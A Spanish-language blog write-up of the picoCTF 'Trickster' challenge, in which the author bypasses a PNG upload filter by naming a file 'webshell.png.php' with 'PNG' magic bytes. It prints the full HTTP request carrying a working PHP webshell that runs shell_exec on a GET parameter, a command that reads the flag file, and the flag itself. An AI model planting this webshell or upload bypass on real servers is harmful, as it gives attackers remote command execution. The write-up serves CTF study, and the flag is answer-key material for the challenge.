---
title: Trickster
date: 2025-05-15 00:00:00 +0200
categories: [writeup, picoctf]
tags: [picoctf, trickster, webexplotation]     
image:
    path: https://picoctf.org/img/logos/pico-mark.svg
    alt: PicoCTF
---

>Trickster
Author: Junias Bonou
Description
I found a web app that can help process images: PNG images only! Try it here!
{: .prompt-tip }

Cuando visitamos la instancia aparece un formulario donde se puede subir un archivo, en principio

``` html
<!DOCTYPE html>
<html>
<head>
    <title>File Upload Page</title>
</head>
<body>
    <h1>Welcome to my PNG processing app</h1>

    
    <form method="POST" enctype="multipart/form-data">
        <input type="file" name="file" accept=".png">
        <input type="submit" value="Upload File">
    </form>
</body>
</html>
```
Como no sabemos si se sanitizó la entrada creo que empezaré por probar a subir un archivo .png con contenido php. Como php se procesa del lado del servidor es posible que consigamos RCE como había hecho anterirormente en [posts/picoctf-n0s4n1ty/](../picoctf-n0s4n1ty).
Así que renombro el info.php en info.png.php, pero esta vez el filtro funciona para lo que no parezca una imagen png. En cierta manera
el servidor detecta que no es una imagen, por lo que hay que afinar un poco más.  

Al subir una imagen png simplemente nos dice que la va a procesar. Así que se almacena en algun lado. ¿/uploads?(más adelante me doy cuenta de que había una pista, pero lo adiviné al simplemente subir candadito.png y comprobar que estaba en /uploads/candadito.png.
Ahora con ZAP capturo el POST que se realiza al subir una imagen:

```
POST http://atlas.picoctf.net:62712/ HTTP/1.1
Host: atlas.picoctf.net:62712
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Content-Type: multipart/form-data; boundary=---------------------------132556845750925031918361941
Content-Length: 2810
Origin: http://atlas.picoctf.net:62712
Connection: keep-alive
Referer: http://atlas.picoctf.net:62712/
Upgrade-Insecure-Requests: 1
Priority: u=0, i

-----------------------------132556845750925031918361941
Content-Disposition: form-data; name="file"; filename="candadito.png"
Content-Type: image/png

PNG

   
IHDR   á   á    Ø¦  	çIDATxì_UGÇ§ÒR ¢d74[,ÝÄÝ¦]Ñ6²ô MÝF³O$øÀîqcHª±Ic#áE<Ø0¦¦Ò»õÏú@oµ	-ÉÅvDÙVª»voSWnðöï=¿ßoÎüæï½Ï;÷óaæ3ÿÎÌ­7Æû­_þÏ{þö¡©Êíz6UºïÜ¸i>%
·
¯¼õÊïßêytÇÃ÷bSÓ4l¼ñ»C®cö<þX.E7PÛ«LqçèUX¢
@G¼þ[kd5@kÞE§g°aµÏÛoëwÛ°ÚÍ¯0ÇýÙý1«(;ùÍåwþ)<ç6æ, ¨æ0ÌóìE
12×i¦·TÎ2pîó°¨8ËxÞ«8A³í(..N¶¬?¾þ&ºp.ÍP[ÕÓ=W[ Ë}xýúÀý[Ö¯Y½úÚµFão¾¢ub³ÿhÈ`ØøÂÒè}òáÏl\Ór}æÏµ×~é÷b Æ£w®Ï~*5¾áªµm4~8½7·@x6Ó®r÷9ÇÙ©/ÑÙ=ìø6°_à³ª§ÅéÐD6T|
í5í#êªÉh·5 ÕOÃ§lö´WÏÄi[4½¯ÀÏð9ËõMz&Û¶Ä´Ç3"7^-õ\kÀ¸Rñ1¼*_SO¶çCsúác¸[¼¢ÝÓ>.+fOÆ#>ùñp8GâU1Æ½9bÐN¯SP¾±±7zCñM83ùIQÚR·ÏJÿÛ»´§[èKÆrÆ@Ý¶¸EË+h¹rlIióPêg8	4]ãBà·/¡+Ì3ÂOn1!nWÅ¥áÓü"ú`× ´¨õSÝ}ø¿;xØ,nÔzïå¨~	¹î>ü	ªåÅ~]ÑM~Ú>\1ºÙbä	ÀÚû*C¡Ñ¨~% «»©îÃ;ÿECF¿ª8Íá­ºÏ5÷á&Ø4]üyjíðEÏûØIø~?ÞöìÅ¬0äÏ~Pâ­ðÉ g¢¾ÆBqäÍ Þ!YP¾@z·bÒN°Uó«t(¥¬U~ÎóÎ=4ÓÂpçáÛ,d'"aÆf6-çxÝ,á5ß¢R£Ãw)}V©Bºóê=dÞ¤ÛÝæÜÎÃþ/!7¢³^¢øîE¾FÞDÄê4¼L<HçxcxÜHVr¿Õiø:
4¡à&tªf§!íyÏ71VLëH]
È£Dml¡ "u¾O>HÔÆ&ð®â¤iÇï.ÃÿÒ ÈKl|ÿîs¦;¿~Ë5ïCÞNf§LwSé.Cv¯4\E3Qj¡ÞiCÑù¤¡·¹ÍÃ§Éßì)@¨ÏÿâÍçenÍ}UHÖ¿?L?¼¾aá#æõ ¬3hÃðIò7+A	êËzÄí´åy-íà¥4©¹Ø^yèC=ùX²æb{å¡4)¹kÖùì?K.Fj8Ý-TÊGöKFjø±ÕquHÄk¸_ü¢&ÍÔÐkb_|¬¢,¯¡9HF«Æ-£)ñ{qü>Ëa&rÑ*µaK.Úã6\ÊÅÁÈ
Íþ9Å4ÁØ
çSãm[,²ßlOßÐÕíb/¥nJÃø)
ã§½ÿ Îöz[ÜÝT*}A©ÓAF:HíÙÇfy[ü #¬%L~o¯RÚON»ã7tQÆOi?¥aüñSÆOi?.CömÅªp×
:«NL§_#&OXuÎD8)ò9ØWþüû6ÚALÚ!§Èðá#-¥+´pz@Ê'MüñS¶?GùG®IÈÛÃ¾¤a[ÀßÇ]µÇn8·æ[ªbäÚ¥)Æm¸´j_ÊÂQ¶,KhÏÅ
ë.Zs1bC²°¤-]#¤½÷]yÅé¬º²Bö¡äß[lß¶;òð¸µ|ûvm9Or¹ z»V(öq}é¼{Þ´Ö&r(*Fjø: Ýn¾.í^:4RCÓÅ^Õ+9±!]¾Ö&±¡éhÍE«`Ì­¹h:¯­ñnÝ;îZl¨£craâ[`0ÃKg³´&RßÎí±ìê4Ag½ôHêä_"p_¦5'h4¬cÊ¹î} ÃygþûVº
oLô8ðO~,>8¢ß1ZDñÏÒú!ëo#kÙL \[Ó
_ßº¶SØ
Öd°g¶98ð=hz g¾ì<äPáHÃnAcÙ×Y	Ð°þ ê°¡ÚYÛíûÁ¾ôkíaij6ôñsøAú<@¾JTÌðÇ±/Kkeø×Ñ§@©j@JôÑUi»½CE¶FÆÖ°Me±¥3+ì¯ÜGFÑzrÊÃ·XHï{s×=Ïw©9IVÈï v¶efê3ìMò[L²@¬&6äø3ú3dý\ Cºw%¹ÙUmáZWG þRºÐÁ7èîIQ`Y]®|7=­m![ÔÐE-+âÀ²þ^ú~d:³uè>¤+¹ÿP	® È°ü=BîL¶'ÖÇ1é* ²}àõÔ·NïÂ¤« dø
8h }þÌv\	Èï¸¾e¹!ßØñwúë×1Éj 
K5}n± ¾º×Ñ¶cÕ?æÃ1CCÃ­o\:Æu7¦bÇ((ÃÝÒ<eù.(U
¨÷áV¯iöñ)<°7þO=ÝëC3Üåñø*Q
¸Z¾ÃôxY4¼WØÖW¤;m'<À÷÷åô¸$5 Ûº-«ÅUIç@VÄ­à	c°Í@ÛÎ]S ÎûmwÍ:îÅZáè6þº³ârðôÏX]Þq°ÆÚ~q%¾Ç÷Ól=?Æ[7ßóMÖiZ!z¢v]¨±ÍXÇ+´¢F¾¶­t¯ôÊ®[1$PoâÊ~L æyÞ:JÃø)
ã§4Ò0~JÃø)È±ýtF}»VéþDâïÕaÑÈp°Ø^ß4Êû0~JÃø)
ã§4Ò0~JÃÍ®Î«æ}þûhi|³@¾hÍ½b¿{jcJÃø)
ã§4Ò0~JÃø)
ã§4  ÿÿî£O±yëi    IEND®B`
-----------------------------132556845750925031918361941--
```

Ahora vamos a ver que pasa si retiro el contenido de datos de imagen y lo sustituyo con un código malicioso, para este caso
he codificado una minima webshell, el truco está en llamarle al archivo co la extensión .png.php 

```
POST http://atlas.picoctf.net:62712/ HTTP/1.1
host: atlas.picoctf.net:62712
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Content-Type: multipart/form-data; boundary=---------------------------11406924858310626671920572531
content-length: 308
Origin: http://atlas.picoctf.net:62712
Connection: keep-alive
Referer: http://atlas.picoctf.net:62712/
Upgrade-Insecure-Requests: 1
Priority: u=0, i

-----------------------------11406924858310626671920572531
Content-Disposition: form-data; name="file"; filename="webshell.png.php"
Content-Type: image/png

PNG

<html>
<body>
    <h4>MINIMUM PHP WEBSHELL</h4>
    <form method="GET" name="formulario">
        <input type="text" name="cmd" size="100">
        <input type="submit" value="SEND">
    </form>

    <?php
    if (isset($_GET['cmd'])) {
        $cmd = $_GET['cmd'];
        echo "<pre>" . shell_exec($cmd) . "</pre>";
    }
    ?>
</body>
</html>

-----------------------------11406924858310626671920572531--

```
Ahora podemos lanzar comandos y recibir los resultados para finalmente, leer el archivo que contiene la bandera.
si hubiera mirado el archivo robots.txt antes, nos da una pequeña pista

```
User-agent: *
Disallow: /instructions.txt
Disallow: /uploads/
```
El fichero instructions.txt contiene un poco de información pero no es muy relevante a la hora de resolver el reto

```
Let's create a web app for PNG Images processing.
It needs to:
Allow users to upload PNG images
	look for ".png" extension in the submitted files
	make sure the magic bytes match (not sure what this is exactly but wikipedia says that the first few bytes contain 'PNG' in hexadecimal: "50 4E 47" )
after validation, store the uploaded files so that the admin can retrieve them later and do the necessary processing.
```

```
cat ../HFQWKODGMIYTO.txt
```

flag **picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_9ae8fb17}**

Por una parte el reto es interesante en cuanto a la forma, crear una webshell, pero el fondo de la cuestión es si realmente se puede explotar esto en versiones recientes de PHP, dado que la clave de esta vulnerabilidad reside en que realmente el formulario permite subir archivos con extensiones diferentes a las esperadas.    

